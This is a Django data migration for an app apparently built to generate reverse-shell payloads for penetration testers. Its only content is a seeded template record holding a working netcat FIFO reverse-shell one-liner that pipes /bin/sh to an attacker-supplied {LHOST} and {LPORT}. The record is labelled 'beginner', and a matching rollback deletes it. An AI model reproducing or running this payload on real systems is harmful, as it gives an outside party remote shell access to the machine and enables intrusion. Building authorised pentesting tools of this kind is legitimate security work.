from django.db import migrations


def add_reverse_netcat_template(apps, schema_editor):
    ShellTemplate = apps.get_model("shells", "ShellTemplate")

    exists = ShellTemplate.objects.filter(shell_type="reverse", language="netcat").exists()
    if exists:
        return

    ShellTemplate.objects.create(
        name="Netcat Reverse FIFO",
        shell_type="reverse",
        language="netcat",
        os="linux",
        description="Reverse netcat shell using FIFO for environments without -e.",
        template="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        tags="netcat,reverse,fifo",
        difficulty="beginner",
        is_active=True,
    )


def remove_reverse_netcat_template(apps, schema_editor):
    ShellTemplate = apps.get_model("shells", "ShellTemplate")
    ShellTemplate.objects.filter(
        shell_type="reverse",
        language="netcat",
        template="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    ).delete()


class Migration(migrations.Migration):

    dependencies = [
        ("shells", "0001_initial"),
    ]

    operations = [
        migrations.RunPython(add_reverse_netcat_template, remove_reverse_netcat_template),
    ]

